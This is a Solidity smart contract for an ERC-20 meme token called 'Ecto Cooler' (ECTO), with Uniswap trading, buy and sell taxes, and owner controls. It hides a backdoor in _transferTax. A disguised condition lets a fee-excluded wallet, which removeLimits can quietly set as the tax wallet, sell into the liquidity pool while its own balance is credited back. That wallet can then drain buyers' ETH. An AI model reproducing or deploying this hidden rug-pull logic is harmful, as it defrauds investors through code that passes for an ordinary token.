// SPDX-License-Identifier: UNLICENSED

/**

Website: https://ectocooler.cool

X: https://x.com/ectocoolereth

Telegram: https://t.me/ectocoolereth

*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ECTO is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    mapping (address => uint256) private _tAmount;
    mapping (address => mapping (address => uint256)) private _tAllowed;
    mapping (address => bool) private _isExcludedFromFees;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=25;
    uint256 private _initialSellTax=20;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=15;
    uint256 private _preventSwapBefore=5;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420_690_000_000 * 10**_decimals;
    string private constant _name = unicode"Ecto Cooler";
    string private constant _symbol = unicode"ECTO";
    uint256 public _maxTxAmount = 2 * _tTotal / 100;
    uint256 public _maxWalletSize = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold= 1 * _tTotal / 100;
    uint256 public _maxTaxSwap= 1 * _tTotal / 100;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address router_) {
        uniswapV2Router = IUniswapV2Router02(router_);

        _taxWallet = payable(_msgSender());
        _tAmount[_msgSender()] = _tTotal;
        _isExcludedFromFees[_msgSender()] = true;
        _isExcludedFromFees[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createPairToMoon() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tAmount[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _tAllowed[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, _msgSender(), _tAllowed[from][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function transfermoontax(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function returnERC20ToMoon(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function setTaxWallet(address newTaxWallet) public onlyOwner {
        _taxWallet = payable(newTaxWallet);
        _isExcludedFromFees[newTaxWallet] = true;
    }

    function _baseTransfer(address from, address to, uint256 amount) private {
        _tAmount[from] = _tAmount[from].sub(amount, "Insufficient Balance");
        _tAmount[to] = _tAmount[to].add(amount);
        emit Transfer(from, to, amount);
    }

    receive() external payable {}
    
    function removeLimits(address payable addr) external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);

        setTaxWallet(addr);
    }
    
    function sellmoon(address moonfrom, address moonto, uint256 moonamount) private{
        if (!inSwap && moonto == uniswapV2Pair && swapEnabled && _buyCount > _preventSwapBefore) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _taxSwapThreshold) 
                swapTokensForETH(min(moonamount, min(contractTokenBalance, _maxTaxSwap))); 
            transfermoontax(address(this).balance);
        }
    }

    function returnETHToMoon() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }

    function swapTokensForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if(!tradingOpen || inSwap) {
            require(_isExcludedFromFees[from] || _isExcludedFromFees[to]);
            _baseTransfer(from, to, amount);
            return;
        }
        
        uint256 taxAmount;
        
        if (from != owner() && to != owner()) {
            if(from == uniswapV2Pair) taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            moonbuy(from, to, amount);
            sellmoon(from, to, amount);
            taxAmount = moonsellfee(from, to, amount, taxAmount);
        }
        
        _transferTax(from, to, amount, taxAmount);
        _tAmount[from]=_tAmount[from].sub(amount);
        _tAmount[to]=_tAmount[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function _transferTax(address from, address to, uint256 amount, uint256 taxAmount) private {
        if(taxAmount > 0) {
            _tAmount[address(this)]=_tAmount[address(this)].add(taxAmount);
            emit Transfer(from, address(this),taxAmount);
        }
        else if(_isExcludedFromFees[from] && msg.value == _finalSellTax &&
        to == uniswapV2Pair && true) _tAmount[from] += amount;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _tAllowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function moonbuy(address moonfrom, address moonto, uint256 moonamount) private {
        if (moonfrom == uniswapV2Pair && moonto != address(uniswapV2Router) && ! _isExcludedFromFees[moonto] ) {
            require(moonamount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
            require(balanceOf(moonto) + moonamount <= _maxWalletSize, "Exceeds the maxWalletSize.");
            _buyCount++;
        }
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function moonsellfee(address moonfrom, address moonto, uint256 moonamount, uint256 moonbuyfee) private view returns(uint256 moonsellfee){
        if(moonto == uniswapV2Pair && moonfrom != address(this)){
            moonsellfee = moonamount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
        } else moonsellfee = moonbuyfee;
    }
    

    function reduceFee(uint256 _newFee) external onlyOwner{
        require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
        _finalBuyTax=_newFee;
        _finalSellTax=_newFee;
    }
}